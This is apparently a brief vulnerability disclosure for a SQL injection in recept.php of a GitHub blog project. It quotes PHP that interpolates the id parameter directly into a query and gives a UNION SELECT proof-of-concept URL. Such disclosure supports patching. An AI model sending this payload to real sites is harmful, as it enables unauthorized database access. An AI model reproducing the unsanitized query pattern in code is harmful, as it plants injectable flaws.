#powered by sebao from 404team#


##Vulnerability link##
https://github.com/zorovavi/blog

##Vulnerability details##
in recept.php line 41 allows SQL Injection via the id parameter

	<?php 
		$id=$_GET["id"];
		require_once("db.php"); 
		$query=mysql_query("SELECT recept FROM recept WHERE id_z=$id", $link) or die(mysql_error());
		$zag1=mysql_fetch_row($query);
		$zag=$zag1[0];
	?>
	<p><img src="images/<?php echo "$id" ?>.jpg" alt = "рецепт"><?php echo "$zag"?></p>
  
##POC:##

http://target/recept.php?id=-1 union select user()
